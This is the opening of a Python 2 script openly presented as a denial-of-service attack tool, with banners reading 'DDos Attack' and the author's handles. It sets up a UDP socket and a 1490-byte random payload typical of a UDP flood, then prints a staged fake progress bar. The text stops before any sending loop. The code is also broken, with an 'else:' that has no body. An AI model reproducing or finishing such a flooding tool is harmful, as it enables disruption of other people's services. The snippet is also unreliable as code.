import sys
import os
import re
import urllib.request
import time
import socket
import socks
import random
import threading
#Code Tim
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

from bs4 import BeautifulSoup

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR) # per evitare di visualizzare l'errore d'avvio di scapy

if sys.platform.startswith("linux"): # se si è sotto linux
	from scapy.all import * # importa scapy
elif sys.platform.startswith("freebsd"): # o sotto freebsd
	from scapy.all import * # importa scapy
else: # altrimenti

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet DDos Attack")
print
print "Author   : HelloMyFriend"
print "github   : https://github.com/bossy0"
print "Facebook : https://www.facebook.com/Bossy.078"
print


os.system("clear")
os.system("figlet Attac Starting")
print "[                    ] 0% "
time.sleep(5)
print "[=====               ] 25%"
time.sleep(5)
print "[==========          ] 50%"
time.sleep(5)
print "[===============     ] 75%"
time.sleep(5)
print "[====================] 100%"
time.sleep(3)
sent = 0
